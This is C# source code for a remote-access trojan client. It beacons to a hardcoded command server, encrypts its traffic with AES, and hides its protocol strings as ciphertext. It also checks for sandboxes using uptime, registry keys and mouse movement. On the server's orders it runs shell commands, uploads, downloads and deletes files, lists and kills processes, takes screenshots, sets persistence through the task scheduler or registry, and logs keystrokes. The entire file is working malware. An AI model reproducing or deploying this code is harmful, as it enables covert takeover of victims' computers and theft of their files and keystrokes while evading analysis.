using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using Newtonsoft.Json;
using System.IO;
using System.Net.Http;
using Microsoft.Win32;
using System.Net.Sockets;
using System.Net;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace EasyContral
{
    internal class Program
    {
        static string Server_Ip = "cloud.foreverhome.live";// Server端地址
        static public string Key = "jV5lO66M/CmXk3OP067sLbgfYTAanFcAT8oOhSzUYtw=";
        static public string IV = "rNQez1Kfq8OqujG5EuyrVA==";

        static string ClientID = SystemInfo.GetClientID();
        static string CPUInfo = SystemInfo.GetCpuName();
        static string OSInfo = SystemInfo.GetSystemVersion();
        static string MemoryInfo = SystemInfo.GetMemoryInMb();
        static string HostName = SystemInfo.GetSystemName();
        static List<string> DriveInfo = SystemInfo.GetDrive();
        static int WaitTime = 5000;


        static void Main(string[] args)
        {
            if (AntiSandBox())
            {
                return;
            }
            string Drive = "";
            foreach (string dirve in DriveInfo)
            {
                Drive += dirve + "|";
            }
            HttpClient client = new HttpClient();
            string a = AESDecrypt("0xAu5UiRiZnoXm+bJodmQg==", Key, IV);
            string b = AESDecrypt("OqYQ3RtTKfVCu++DfKYx4Q==", Key, IV);
            string c = AESDecrypt("sLPOasNk+M6R5RamrIlOoA==", Key, IV);
            string d = AESDecrypt("fR42XnBH1YSP/1UeSUe27Q==", Key, IV);
            string e = AESDecrypt("GtSeAvriDjw9UP/FPWB+SQ==", Key, IV);
            string f = AESDecrypt("x3Hkt9kHTYUwmI36ryynrQ==", Key, IV);
            string g = AESDecrypt("aWE9zu/7O82b3atgVd6l2A==", Key, IV);
            string h = AESDecrypt("MeQNthYfPvz5oru24Vr0hQ==", Key, IV);
            string i = AESDecrypt("wHmhVCjw4b+gUiVQSaHM3w==", Key, IV);
            string k = AESDecrypt("YfckT1CDHddRjspyK/+G7A==", Key, IV);
            while (true)
            {
                try
                {
                    Dictionary<string, Dictionary<string, string>> DicMessage = new Dictionary<string, Dictionary<string, string>>();
                    Dictionary<string, string> State = new Dictionary<string, string>();
                    Dictionary<string, string> Data = new Dictionary<string, string>();
                    //State.Add("Type", "Connecting");
                    State.Add(a, b);
                    //State.Add("ClientID", ClientID);
                    State.Add(c, ClientID);
                    //Data.Add("CPUInfo", CPUInfo);
                    Data.Add(d, CPUInfo);
                    //Data.Add("OSInfo", OSInfo);
                    Data.Add(e, OSInfo);
                    //Data.Add("MemoryInfo", MemoryInfo);
                    Data.Add(f, MemoryInfo);
                    //Data.Add("HostName", HostName);
                    Data.Add(g, HostName);
                    //DicMessage.Add("State", State);
                    DicMessage.Add(h, State);
                    //DicMessage.Add("Data", Data);
                    DicMessage.Add(i, Data);
                    string JsonMessage = DicToJson(DicMessage);
                    JsonMessage = AESEncrypt(JsonMessage, Key, IV);
                    var content = new StringContent(JsonMessage, Encoding.UTF8, "application/json");
                    HttpResponseMessage Response = client.PostAsync($"http://{Server_Ip}:4400/", content).Result;
                    string ResponseBody = Response.Content.ReadAsStringAsync().Result;
                    ResponseBody = AESDecrypt(ResponseBody, Key, IV);
                    Dictionary<string, Dictionary<string, string>> result = new Dictionary<string, Dictionary<string, string>>();
                    result = JsonToDic(ResponseBody);
                    DicMessage.Clear();
                    State.Clear();
                    Data.Clear();
                    //string Type = result["State"]["Type"];
                    string Type = result[h][a];
                    //string Command = result["Data"]["ServerMessage"];
                    string Command = result[i][k];
                    switch (Type)
                    {
                        case "CMD":
                            string output = GeneralContral.Shell(Command);
                            //SendToServer(result, output, "CMDResult");
                            SendToServer(result, output, AESDecrypt("la/g01byyTkNvvbd8KCOmw==", Key, IV));
                            break;
                        case "Drives":
                            //SendToServer(result, Drive, "DirResult");
                            SendToServer(result, Drive, AESDecrypt("U9ImpoXkig2Ym3GuDa1umw==", Key, IV));
                            break;  
                        case "Files":
                            string files = FileContral.GetFileList(Command);
                            //SendToServer(result, files, "FilesResult");
                            Console.WriteLine("yyyy");
                            SendToServer(result, files, AESDecrypt("ZxFxSeeIg6vzRpV18NdzyQ==", Key, IV));
                            break;
                        case "File_Upload":
                            //string file = result["Data"]["FileData"];
                            string file = result[AESDecrypt("wHmhVCjw4b+gUiVQSaHM3w==", Key, IV)][AESDecrypt("iKbImWYMAqPazPQ7cW5flw==", Key, IV)];
                            FileContral.UploadFile(Command, file);
                            //SendToServer(result, "OK", "File_UploadResult");
                            SendToServer(result, "OK", AESDecrypt("Tw3iR732+O93AxseWpqih/dU7Guy9ODN7i0k7HcnZzs=", Key, IV));
                            break;
                        case "File_Download":
                            string FileName = Path.GetFileName(Command);
                            string FileTxt = FileContral.DownloadFile(Command);
                            //SendToServer(result, FileName + "?" + FileTxt, "File_DownloadResult");
                            SendToServer(result, FileName + "?" + FileTxt, AESDecrypt("LWQfIWiuWfMziTMJmzzxYrj/Z5caJ9qA+u2MFK1Yu24=", Key, IV));
                            break;
                        case "File_ReName":
                            string NewName = Command.Split('?')[0];
                            string OldName = Command.Split('?')[1];
                            FileContral.RenameFile(OldName, NewName);
                            //SendToServer(result, "OK", "File_ReNameResult");
                            SendToServer(result, "OK", AESDecrypt("LkDO63SM3HLSNUx+hiLfLEPj8rYMG5bnTSFZCT8ZgXw=", Key, IV));
                            break;
                        case "File_Delete":
                            FileContral.DeleteFile(Command);
                            //SendToServer(result, "OK", "File_DeleteResult");
                            SendToServer(result, "OK", AESDecrypt("56mVF/XGQSQpNPi4lEOX2WGydijsmLtG6FzXEhFrf+s=", Key, IV));
                            break;
                        case "GetProcess":
                            Dictionary<string, Dictionary<string, string>> Processs = GeneralContral.AllProcess();
                            string Processs_ = JsonConvert.SerializeObject(Processs);
                            //SendToServer(result, Processs_, "GetProcessResult");
                            SendToServer(result, Processs_, AESDecrypt("1Ur9IeFhne8Gz79ZZ1Qdb8PL42GiuUC88IsO5VOmQsk=", Key, IV));
                            break;
                        case "KillProcess":
                            GeneralContral.KillProcess(Command);
                            //SendToServer(result, "OK", "KillProcessResult");
                            SendToServer(result, "OK", AESDecrypt("OuqBLEjUxP2YEStFJXl77zJcGeXsHmD0zGDiPdbG6QQ=", Key, IV));
                            break;
                        case "CreateProcess":
                            GeneralContral.StartProcess(Command);
                            //SendToServer(result, "OK", "StartProcessResult");
                            SendToServer(result, "OK", AESDecrypt("9Pv2MhLbKggqvE0E9rpGTqMOYVo/Rkadgu3RiAVmgYw=", Key, IV));
                            break;
                        case "GetDesktop":
                            string base64img = GeneralContral.ScreenShot();
                            //SendToServer(result, base64img, "GetDesktopResult");
                            SendToServer(result, base64img, AESDecrypt("y3cBEXi88K2GrN5Gki3x8Xi88YdjXYkYCqIzFz2NXXY=", Key, IV));
                            break;
                        case "AutoRunTaskScheduler":
                            GeneralContral.AutoRun_TaskScheduler();
                            //SendToServer(result, "OK", "AutoRunTaskSchedulerResult");
                            SendToServer(result, "OK", AESDecrypt("KT7lTMzBcTtwzeKfFqESIbKM4O8BsXI3xcmtywC0kIg=", Key, IV));
                            break;
                        case "AutoRunRegistry":
                            GeneralContral.AutoRun_Registry();
                            //SendToServer(result, "OK", "AutoRunRegistryResult");
                            SendToServer(result, "OK", AESDecrypt("f0K33hL+D0BGnVKW8rtojt0VFBYtmae6+9W9QtWhlUI=", Key, IV));
                            break;
                        case "KeyBoardListenOn":
                            GeneralContral.KeyboardListen(true);
                            //SendToServer(result, "OK", "KeyboardListenOnResult");
                            SendToServer(result, "OK", AESDecrypt("mxocd/wji2IVPa/h7NgbBI9VKU53rJ/l02QZ2V3Jtgs=", Key, IV));
                            break;
                        case "KeyBoardListenOff":
                            string KeyBoardLog = GeneralContral.KeyboardListen(false);
                            //SendToServer(result, "OK", "KeyBoardListenOffResult");
                            SendToServer(result, KeyBoardLog, AESDecrypt("dsgCq9/sF/syDnoTxXNkmFfOdT0qOOF7h89z+kLZWjA=", Key, IV));
                            break;
                        case "SetSleepTime":
                            WaitTime = int.Parse(Command) * 1000;
                            break;
                    }
                }
                catch(AggregateException ex) 
                {
                    continue;
                }
                Thread.Sleep(WaitTime);
            }
        }
        static bool AntiSandBox()
        {
            int delay = 60;//延迟执行时间
            TimeSpan span = TimeSpan.FromMilliseconds(Environment.TickCount);//系统运行时间
            if (IsRegistryKeyExists(@"SOFTWARE\Tencent\QQ") || IsRegistryKeyExists(@"SOFTWARE\Tencent\WeChat") || span.TotalSeconds < delay)
            {
                return true;
            }
            string time = GetNetworkTimeInSeconds();
            string mouse_x = Control.MousePosition.X.ToString();
            string mouse_y = Control.MousePosition.Y.ToString();
            while (true)
            {
                string now = GetNetworkTimeInSeconds();
                Console.WriteLine((long.Parse(now) - long.Parse(time)) / 1000);
                if (mouse_x == Control.MousePosition.X.ToString() && mouse_y == Control.MousePosition.Y.ToString())
                {
                    return true;
                }
                if ((long.Parse(now) - long.Parse(time)) / 1000 >= delay)
                {
                    return false;
                }
            }
        }
        public static string GetNetworkTimeInSeconds()
        {
            WebRequest webrequest = WebRequest.Create("https://api.pinduoduo.com/api/server/_stm");
            WebResponse webresponse = webrequest.GetResponse();
            Stream s = webresponse.GetResponseStream();
            StreamReader sr = new StreamReader(s, Encoding.GetEncoding("UTF-8"));
            string result = sr.ReadToEnd();
            result = result.Replace("{\"server_time\":","").Replace("}","");
            Thread.Sleep(5000);
            return result;
        }
        private static uint SwapEndianness(ulong x)
        {
            return (uint)(((x & 0x000000ff) << 24) + ((x & 0x0000ff00) << 8) + ((x & 0x00ff0000) >> 8) + ((x & 0xff000000) >> 24));
        }
        private static bool IsRegistryKeyExists(string registryPath)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registryPath))
            {
                return key == null;
            }
        }
        static void SendToServer(Dictionary<string, Dictionary<string, string>> result,string output,string Type) 
        {
            Dictionary<string, Dictionary<string, string>> DicMessage = new Dictionary<string, Dictionary<string, string>>();
            Dictionary<string, string> State = new Dictionary<string, string>();
            Dictionary<string, string> Data = new Dictionary<string, string>();
            HttpClient client_ = new HttpClient();
            State.Add("Type", Type);
            State.Add("ClientID", ClientID);
            Data.Add("Result", output);
            DicMessage.Add("State", State);
            DicMessage.Add("Data", Data);
            string JsonMessage_ = DicToJson(DicMessage);
            JsonMessage_ = AESEncrypt(JsonMessage_, Key, IV);
            var content_ = new StringContent(JsonMessage_, Encoding.UTF8, "application/json");
            client_.PostAsync($"http://{Server_Ip}:4400/", content_);
        }
        static string DicToJson(Dictionary<string,Dictionary<string,string>> DicMessage)
        {
            string Json = JsonConvert.SerializeObject(DicMessage, Formatting.Indented);
            return Json;
        }
        static Dictionary<string, Dictionary<string, string>> JsonToDic(string Json)
        {
            Dictionary<string, Dictionary<string, string>> Dic = JsonConvert.DeserializeObject<Dictionary<string, Dictionary<string, string>>>(Json);
            return Dic;
        }
        public static string AESEncrypt(string plainText, string key_, string iv_)
        {
            using (Aes aesAlg = Aes.Create())
            {
                byte[] key = Convert.FromBase64String(key_);
                byte[] iv = Convert.FromBase64String(iv_);
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(plainText);
                        }
                        return Convert.ToBase64String(msEncrypt.ToArray());
                    }
                }
            }
        }
        public static string AESDecrypt(string cipherText, string key_, string iv_)
        {
            using (Aes aesAlg = Aes.Create())
            {
                byte[] key = Convert.FromBase64String(key_);
                byte[] iv = Convert.FromBase64String(iv_);
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(Convert.FromBase64String(cipherText)))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            return srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
        }
    }
}
